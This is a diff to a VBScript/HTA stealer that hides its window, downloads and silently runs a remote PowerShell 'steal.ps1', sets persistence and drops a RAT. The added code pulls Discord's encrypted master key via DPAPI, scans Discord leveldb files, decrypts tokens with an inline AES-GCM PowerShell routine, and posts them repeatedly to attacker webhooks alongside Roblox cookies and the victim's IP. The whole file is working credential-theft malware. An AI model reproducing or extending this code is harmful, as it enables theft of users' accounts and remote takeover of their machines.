@@ -6,7 +6,7 @@
 window.resizeTo 1,1:window.moveTo -3000,-3000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
+Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie, foundToken, foundCookie
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -21,18 +21,23 @@ lastCookie = ""
 ' --- 1. INITIAL (WH ONLY) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
+
+' Run steal.ps1 AND VBScript native backup
 Call GrabTokens(WH)
+Call GrabTokensNative(WH)
+
 Call Persistence
 Call PostCookieOnly(WH)
 Call DropRAT(WH)
 
-' --- 2. LOOP (RE_WH ONLY, NO RAT, EXITS AFTER 1 RUN) ---
+' --- 2. LOOP (RE_WH ONLY, NO RAT) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
     Call GrabTokens(RE_WH)
+    Call GrabTokensNative(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     Call SleepSeconds(30)
@@ -47,7 +52,6 @@ Sub GrabTokens(targetWH)
     Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     
-    ' Your exact steal.ps1 URL
     xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
     xh.Send
     If xh.Status = 200 Then psData = xh.responseText
@@ -63,19 +67,13 @@ Sub GrabTokens(targetWH)
         ' Launch PS1 hidden
         sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
 
-        ' BLOCKING WAIT: Poll for the file up to 60 seconds so mshta doesn't crash
+        ' Wait up to 15 seconds (gives PS1 time to write)
         Dim waited : waited = 0
-        Dim sz : sz = 0
         Do
             Call SleepSeconds(2)
             waited = waited + 2
-            If fso.FileExists(tf) Then
-                On Error Resume Next
-                sz = fso.GetFile(tf).Size
-                On Error GoTo 0
-                If sz > 10 Then Exit Do ' File has content, break wait
-            End If
-        Loop While waited < 60
+            If fso.FileExists(tf) Then Exit Do
+        Loop While waited < 15
 
         If fso.FileExists(tf) Then
             cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
@@ -104,6 +102,7 @@ Sub GrabTokens(targetWH)
                             If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                             info = info & "**Token:** " & p(4)
                             Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
+                            foundToken = True
                         End If
                     ElseIf Left(l, 9) = "ROBLOXMS|" Then
                         Dim c1: c1 = Mid(l, 10)
@@ -115,6 +114,61 @@ Sub GrabTokens(targetWH)
                 Next
             End If
         End If
+    End If
+End Sub
+
+' --- NATIVE TOKEN GRABBER (BACKUP IF PS1 FAILS) ---
+Sub GrabTokensNative(targetWH)
+    If foundToken = True Then Exit Sub
+    Dim appdata, paths, i, filePath, raw, mk, startPos, endPos, b64, token
+    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
+    
+    Dim lsPath : lsPath = appdata & "\discord\Local State"
+    If fso.FileExists(lsPath) Then
+        raw = ReadFile(lsPath)
+        startPos = InStr(raw, """encrypted_key"":""") + 17
+        If startPos > 17 Then
+            endPos = InStr(startPos, raw, """")
+            b64 = Mid(raw, startPos, endPos - startPos)
+            mk = DecryptDPAPI(b64)
+            If Len(mk) > 5 Then mk = Base64Encode(Mid(mk, 6))
+        End If
+    End If
+
+    If Len(mk) > 0 Then
+        paths = Array(appdata & "\discord\Local Storage\leveldb", appdata & "\discordptb\Local Storage\leveldb", appdata & "\discordcanary\Local Storage\leveldb")
+        For i = 0 To UBound(paths)
+            If fso.FolderExists(paths(i)) Then
+                Dim folder, f
+                Set folder = fso.GetFolder(paths(i))
+                For Each f In folder.Files
+                    If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 4) = ".log" Then
+                        raw = ReadFile(f.Path)
+                        startPos = 1
+                        Do
+                            startPos = InStr(startPos, raw, "dQw4w9WgXcQ:")
+                            If startPos = 0 Then Exit Do
+                            startPos = startPos + 12
+                            endPos = startPos
+                            Do
+                                Dim char : char = Mid(raw, endPos, 1)
+                                If char = """" Or char = "\" Or Asc(char) < 32 Then Exit Do
+                                endPos = endPos + 1
+                                If endPos - startPos > 200 Then Exit Do
+                            Loop
+                            b64 = Mid(raw, startPos, endPos - startPos)
+                            If Len(b64) > 40 Then
+                                token = DecryptGCM(mk, b64)
+                                If Len(token) > 30 Then 
+                                    Call PostEmbedTo(":gift: Discord Token", "**Token:** " & token, 10181046, targetWH)
+                                    foundToken = True
+                                End If
+                            End If
+                        Loop
+                    End If
+                Next
+            End If
+        Next
     End If
 End Sub
 
@@ -275,6 +329,35 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
     On Error GoTo 0
+End Function
+
+Function DecryptGCM(key, b64)
+    DecryptGCM = ""
+    Dim inf: inf = TmpFile("gcm.txt")
+    Dim outf: outf = TmpFile("gcm_out.txt")
+    On Error Resume Next
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "try{$k=[Convert]::FromBase64String('" & key & "');$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$n=$b[3..14];$c=$b[15..($b.Length-17)];$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$k;$aes.Mode='ECB';$aes.Padding='None';$e=$aes.CreateEncryptor();$o=New-Object byte[] $c.Length;$cb=New-Object byte[] 16;$n.CopyTo($cb,0);$cb[15]=2;for($i=0;$i -lt $c.Length;$i+=16){$kk=$e.TransformFinalBlock($cb,0,16);for($j=0;$j -lt [Math]::Min(16,$c.Length-$i);$j++){$o[$i+$j]=$c[$i+$j] -bxor $kk[$j]};for($j=15;$j -ge 12;$j--){$cb[$j]++;if($cb[$j] -ne 0){break}}};[Text.Encoding]::UTF8.GetString($o)|Out-File '" & outf & "' -Encoding ascii}catch{}"
+    Dim psf: psf = TmpFile("gcm.ps1")
+    WriteFile psf, ps
+    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
+    If fso.FileExists(outf) Then DecryptGCM = ReadFile(outf)
+    fso.DeleteFile inf, True
+    fso.DeleteFile psf, True
+    fso.DeleteFile outf, True
+    On Error GoTo 0
+End Function
+
+Function Base64Encode(str)
+    Dim xml, node
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.nodeTypedValue = str
+    Base64Encode = node.text
+    Set node = Nothing
+    Set xml = Nothing
 End Function
 
 Sub PostEmbed(t, d, c)
